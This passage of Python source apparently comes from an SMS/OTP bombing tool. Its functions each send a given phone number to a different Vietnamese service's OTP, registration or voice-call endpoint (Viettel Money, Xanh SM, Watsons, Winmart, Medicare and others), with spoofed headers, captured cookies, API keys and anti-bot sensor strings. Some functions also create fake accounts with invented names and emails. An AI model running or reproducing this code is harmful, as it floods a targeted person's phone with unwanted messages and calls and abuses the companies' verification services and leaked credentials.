        "referer": "https://app.ahamove.com/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "mobile": phone,
        "country_code": "VN",
        "firebase_sms_auth": True,
    }
    response = requests.post(
        "https://api.ahamove.com/api/v3/public/user/login",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_ViettelMoney(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"
    payload = json.dumps(
        {"identityType": "msisdn", "identityValue": phone, "type": "REGISTER"}
    )
    headers = {
        "User-Agent": "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
        "Accept-Encoding": "gzip;q=1.0, compress;q=0.5",
        "Content-Type": "application/json",
        "app-version": "8.8.8",
        "product": "VIETTELPAY",
        "type-os": "ios",
        "accept-language": "vi",
        "imei": "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
        "device-name": "iPhone",
        "os-version": "16.0",
        "authority-party": "APP",
        "Cookie": "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8VnQhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg",
    }
    response = requests.post(url, data=payload, headers=headers)
def call_xanhsmsms(phone):
    if phone.startswith("09"):
        phone = "+84" + phone[1:]
    elif phone.startswith("03"):
        phone = "+84" + phone[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
    params = {"aud": "user_app", "platform": "ios"}
    payload = json.dumps(
        {"is_forgot_password": False, "phone": phone, "provider": "VIET_GUYS"}
    )
    headers = {
        "User-Agent": "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
        "Accept": "application/json",
        "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        "Content-Type": "application/json",
        "app-version-label": "3.15.0",
        "app-build-number": "89",
        "accept-language": "vi",
        "platform": "iOS",
        "aud": "user_app",
    }
    response = requests.post(url, params=params, data=payload, headers=headers)
def call_xanhsmzalo(phone):
    if phone.startswith("09"):
        phone = "+84" + phone[1:]
    elif phone.startswith("03"):
        phone = "+84" + phone[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"
    params = {"platform": "ios", "aud": "user_app"}
    payload = json.dumps(
        {"phone": phone, "is_forgot_password": False, "provider": "ZNS_ZALO"}
    )
    headers = {
        "User-Agent": "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
        "Accept": "application/json",
        "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        "Content-Type": "application/json",
        "app-version-label": "3.15.0",
        "app-build-number": "89",
        "accept-language": "vi",
        "platform": "iOS",
        "aud": "user_app",
    }
    response = requests.post(url, params=params, data=payload, headers=headers)
def call_popeyes(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://popeyes.vn",
        "ppy": "CWNOBV",
        "priority": "u=1, i",
        "referer": "https://popeyes.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-client": "WebApp",
    }
    json_data = {
        "phone": phone,
        "firstName": "Nguyễn",
        "lastName": "Ngọc",
        "email": "th456do1g110@hotmail.com",
        "password": "et_SECUREID()",
    }
    response = requests.post(
        "https://api.popeyes.vn/api/v1/register",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_ACHECKIN(phone):
    url1 = "https://codepush.appcenter.ms/v0.1/public/codepush/update_check"
    params1 = {
        "deployment_key": "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
        "app_version": "1.5",
        "package_hash": "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
        "label": "v39",
        "client_unique_id": generate_random_id(),
    }
    headers1 = {
        "User-Agent": "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "x-codepush-plugin-version": "5.7.0",
        "x-codepush-sdk-version": "^3.0.1",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "x-codepush-plugin-name": "react-native-code-push",
    }
    response1 = requests.get(url1, params=params1, headers=headers1)
    url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"
    payload2 = json.dumps(
        {
            "operationName": "IdCheckPhoneNumber",
            "variables": {"phone_number": phone},
            "query": "query IdCheckPhoneNumber($phone_number: String!) {  mutation: checkPhoneNumber(phone_number: $phone_number)}",
        }
    )
    headers2 = {
        "User-Agent": "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
        "Content-Type": "application/json",
        "accept-language": "vi-VN,vi;q=0.9",
        "authorization": "undefined",
    }
    response2 = requests.post(url2, data=payload2, headers=headers2)
    payload3 = json.dumps(
        {
            "operationName": "RequestVoiceOTP",
            "variables": {
                "phone_number": phone,
                "action": "REGISTER",
                "hash": "6af5e4ed78ee57fe21f0d405c752798f",
            },
            "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)}",
        }
    )
    response3 = requests.post(url2, data=payload3, headers=headers2)
def call_APPOTA(phone):
    url1 = "https://mobile.useinsider.com/api/v3/session/start"
    payload1 = json.dumps(
        {
            "insider_id": random_id,
            "partner_name": "appotapay",
            "reason": "default",
            "udid": random_id,
            "device_info": {
                "location_enabled": False,
                "app_version": "5.2.10",
                "push_enabled": True,
                "os_version": "17.0.2",
                "battery": 90,
                "sdk_version": "13.4.3-RN-6.4.4-nh",
                "connection": "wifi",
            },
        }
    )
    headers1 = {
        "User-Agent": "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
        "Content-Type": "application/json",
        "ts": "1722417438",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    response1 = requests.post(url1, data=payload1, headers=headers1)
    url2 = "https://api.gw.ewallet.appota.com/v2/users/check_valid_fields"
    payload2 = json.dumps(
        {
            "phone_number": phone,
            "email": "",
            "username": "",
            "ts": 1722417439,
            "signature": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11",
        }
    )
    headers2 = {
        "User-Agent": "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
        "Content-Type": "application/json",
        "client-version": "5.2.10",
        "aw-device-id": formatted_device_id,
        "language": "vi",
        "client-authorization": "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
        "x-device-id": formatted_device_id,
        "x-client-build": "119",
        "x-client-version": "5.2.10",
        "platform": "ios",
        "accept-language": "vi-vn",
        "x-client-platform": "ios",
        "ref-client": "appwallet",
        "x-request-id": "3643ec43-20c4-446d-b3b0-0ac86adf5528",
        "x-request-ts": "1722417439",
    }
    response2 = requests.post(url2, data=payload2, headers=headers2)
    url3 = "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code"
    payload3 = json.dumps(
        {
            "phone_number": phone,
            "sender": "SMS",
            "ts": 1722417441,
            "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5",
        }
    )
    headers3 = {
        "User-Agent": "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
        "Content-Type": "application/json",
        "client-version": "5.2.10",
        "aw-device-id": formatted_device_id,
        "language": "vi",
        "client-authorization": "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
        "x-device-id": formatted_device_id,
        "x-client-build": "119",
        "x-client-version": "5.2.10",
        "platform": "ios",
        "accept-language": "vi-vn",
        "x-client-platform": "ios",
        "ref-client": "appwallet",
        "x-request-id": "4031b828-a4fc-45cb-aeac-c6e3b2f504ab",
        "x-request-ts": "1722417441",
    }
    response3 = requests.post(url3, data=payload3, headers=headers3)
def call_Watsons(phone):
    url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"
    params = {"lang": "vi"}
    payload = json.dumps(
        {
            "otpTokenRequest": {
                "action": "REGISTRATION",
                "type": "SMS",
                "countryCode": "84",
                "target": phone,
            },
            "defaultAddress": {"mobileNumberCountryCode": "84", "mobileNumber": phone},
            "mobileNumber": phone,
        }
    )
    headers = {
        "User-Agent": "WTCVN/24050.8.0 (iOS/17.0.2)",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "x-session-token": "5b3f554c05258ea55ab506a1ffc7aa8d",
        "baggage": "sentry-environment=preprod,sentry-public_key=8d22ab30a0174b6489b1e647ff6a8a28,sentry-release=vn.com.watsons.app%4024050.8.0%2B202407111813,sentry-trace_id=57b207211ecb40ad880861651a5e1914",
        "waiting-room-access-token": "",
        "x-app-name": "Watsons%20VN",
        "x-acf-sensor-data": "4,i,QeSJMIt5h2iaPmIbvXvXq4tVimb8YYYoz9HVkaOkZ4+50dFkANwHVTHJruLOhscngAw9Ajbz0ri+8cJcbazXBtp8Zn1dVjoqDt2YHcMy/yzo2Wjm+Zbvhxlb9t428/+fUnEMAsO67eNo5E8d2NjKOEFsAS+/AhDaXP0+raig9UU=,nAPyAaP9OJeaQNum0Y6YD8WCUBTFQKSGe/JvZkOrtTuLVg4V6hbPeNgDHVgxQeTc1kD+f39Lpk9739rigwa9dWFav4AM7lc8JpVCNuDFC44k5/UQKyt8gAZz+9hkEk6wzYB7o2ezvooWZEXQTZumLksEu6Nf41juprM/tD3KBmI=$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$7,3,12$$",
        "accept-language": "vi",
        "queue-target": "null",
        "cache-control": "no-cache",
        "sentry-trace": "57b207211ecb40ad880861651a5e1914-4b3ff6172e084c9d-0",
        "x-app-version": "24050.8.0",
        "env": "prod",
        "Cookie": "ak_bmsc=4ACC8C3607E0E9232360FDA1E1854E4F~000000000000000000000000000000~YAAQ9VJNG979NwaRAQAA/r9eCBi3G4NOUhKyBSBzBjyDhSfmrUMlGbtziWkFwdlHDattQysx6ioqzAwBYysRMFRqwZNTLa5UIwKiMCqQK52EXJca1/mPkvDYKlUNY6jMqBp8gA0T/uUQNLb+ADwajazL1i/y/uerZjb1BWt4OlsKrjPijiMfqPIW3MhtNi0jydTzlN2GyA9+mOZ16Vbsvdlo4Y+wr1aQAz+eqVktxM+b61s5xpAUDRo5bItDmWb2AjIJyyFU6QmLtiO+z/fwZvUUinqpOZpqrPboLMWwk8M2Jw6KKE/FIloJcpNvF+MUcPxGpI2YlEYshvYxxxYBH+Vn9mdRSYayp6sadTKWrMhVgaObxee0B9CzbCgiY+yxTlapAx7YiqgX4Q==; dtCookie=v_4_srv_36_sn_3F2A2BE1202593EA006C41DC139C0176_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; ROUTE=.accstorefront-78c88c89d7-lvpvg; authorization=pUbs8G_8XY2Hx9NiB8aJ3NCtnxk; token_type=guest",
    }
    response = requests.post(url, params=params, data=payload, headers=headers)
def call_hoangphuc(phone):
    cookies = {
        "form_key": "fm7TzaicsnmIyKbm",
        "mage-banners-cache-storage": "{}",
        "mage-cache-storage": "{}",
        "mage-cache-storage-section-invalidation": "{}",
        "PHPSESSID": "450982644b33ef1223c1657bb0c43204",
        "form_key": "fm7TzaicsnmIyKbm",
        "mage-messages": "",
        "recently_viewed_product": "{}",
        "recently_viewed_product_previous": "{}",
        "recently_compared_product": "{}",
        "recently_compared_product_previous": "{}",
        "product_data_storage": "{}",
        "mage-cache-sessid": "true",
        "mst-cache-warmer-track": "1722425411057",
        "private_content_version": "e7d88709c6ccef5f8c32a41289ece818",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "dnt": "1",
        "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjA5YWE0NzczZGUzM2IxNTciLCJ0ciI6ImFiMWFmYzBkNDUwMTE1Y2U5ZTE0ZjdhZmZmOTI3MTQ5IiwidGkiOjE3MjI0MjU0NDExMDMsInRrIjoiMTMyMjg0MCJ9fQ==",
        "origin": "https://hoang-phuc.com",
        "priority": "u=1, i",
        "referer": "https://hoang-phuc.com/customer/account/create/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "traceparent": "00-ab1afc0d450115ce9e14f7afff927149-09aa4773de33b157-01",
        "tracestate": "1322840@nr=0-1-4173019-1120237972-09aa4773de33b157----1722425441103",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-newrelic-id": "UAcAUlZSARABVFlaBQYEVlUD",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "action_type": "1",
        "tel": phone,
    }
    response = requests.post(
        "https://hoang-phuc.com/advancedlogin/otp/sendotp/",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_fmcomvn(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "Bearer",
        "content-type": "application/json;charset=UTF-8",
        "dnt": "1",
        "origin": "https://fm.com.vn",
        "priority": "u=1, i",
        "referer": "https://fm.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-apikey": "X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv",
        "x-emp": "",
        "x-fromweb": "true",
        "x-requestid": "00c641a2-05fb-4541-b5af-220b4b0aa23c",
    }
    json_data = {
        "Phone": phone,
        "LatOfMap": "106",
        "LongOfMap": "108",
        "Browser": "",
    }
    response = requests.post(
        "https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_Reebokvn(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "key": "63ea1845891e8995ecb2304b558cdeab",
        "origin": "https://reebok.com.vn",
        "priority": "u=1, i",
        "referer": "https://reebok.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "timestamp": "1722425836500",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
        headers=headers,
        json=json_data,
    )
def call_thefaceshop(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "key": "c3ef5fcbab3e7ebd82794a39da791ff6",
        "origin": "https://thefaceshop.com.vn",
        "priority": "u=1, i",
        "referer": "https://thefaceshop.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "timestamp": "1722425954937",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
        headers=headers,
        json=json_data,
    )
def call_BEAUTYBOX(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "key": "ac41e98f028aa44aac947da26ceb7cff",
        "origin": "https://beautybox.com.vn",
        "priority": "u=1, i",
        "referer": "https://beautybox.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "timestamp": "1722426119478",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
        headers=headers,
        json=json_data,
    )
def call_winmart(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "Bearer undefined",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://winmart.vn",
        "priority": "u=1, i",
        "referer": "https://winmart.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-api-merchant": "WCM",
    }
    json_data = {
        "firstName": "Nguyễn Quang Ngọc",
        "phoneNumber": phone,
        "masanReferralCode": "",
        "dobDate": "2000-02-05",
        "gender": "Male",
    }
    response = requests.post(
        "https://api-crownx.winmart.vn/iam/api/v1/user/register",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_medicare(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DNT": "1",
        "Origin": "https://medicare.vn",
        "Referer": "https://medicare.vn/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-XSRF-TOKEN": "eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "mobile": phone,
        "mobile_country_prefix": "84",
    }
    response = requests.post(
        "https://medicare.vn/api/otp", headers=headers, json=json_data, timeout=10
    )
def call_futabus(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://futabus.vn",
        "priority": "u=1, i",
        "referer": "https://futabus.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-access-token": 